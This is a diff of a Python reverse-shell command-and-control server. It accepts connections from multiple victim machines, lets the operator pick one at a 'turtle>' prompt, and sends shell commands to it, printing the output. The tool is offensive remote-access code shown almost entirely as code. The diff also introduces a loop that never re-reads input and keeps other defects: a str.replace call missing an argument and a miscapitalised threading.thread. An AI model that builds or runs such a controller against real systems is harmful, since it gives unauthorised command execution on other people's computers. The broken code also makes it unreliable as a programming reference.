@@ -67,15 +67,16 @@ def accepting_connection():
 
 def start_turtle():
     cmd= input('turtle> ')#will take input like turtle> {input is here without braces}
-    if cmd == 'list':
-        list_connection()
+    while True:
+        if cmd == 'list':
+            list_connection()
 
-    elif 'select' in cmd:
-        conn = get_target(cmd)
-        if conn is not None: # checking if input isnt empty
-            send_target_commands(conn)
-    else:
-        print('command not recognized')
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None: # checking if input isnt empty
+                send_target_commands(conn)
+        else:
+            print('command not recognized')
 
 
 #display all current actibve connections
@@ -94,3 +95,98 @@ def list_connection():
 
          results = str(i) + "  " + str(all_address[i][0])+ '  ' + str(all_address[i][1])
      print('---clients---' + '\n'+ results)
+
+
+def get_target(cmd):
+    try:
+        target = cmd.replace('select ')#now target is just a number
+        target=int(target)
+        conn = all_connection[target]
+        print('you are  connected to :'+ str(all_address[target][0]))
+        print(str(all_address[target][0]) +'>' ,end='')#will show ip address then > then last end='' is for chanaging line
+        return conn
+    except:
+        print('selection not valid')
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd= input()
+            if cmd== 'quit':
+                break
+            if len(str.encode(cmd))>0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(20480),'utf-8')
+                print(client_response,end="") # "" is for new line
+        except:
+            print('error sending command')
+            break
+
+
+
+#create worker threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t= threading.thread(target= work)
+        t.daemon= True# to end thread after completion of operation
+        t.start()
+
+#do next job that is in the queue (handle connection,send commands)
+def work():
+    while True:
+        x= queue.get()
+        if x==1:
+            create_socket()
+            bind_socket()
+            accepting_connection()
+        if x==2:
+            start_turtle()
+
+        queue.task_done()
+
+
+#thread take jobs from queue
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+
+    queue.join()
+
+
+create_jobs()
+create_workers()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
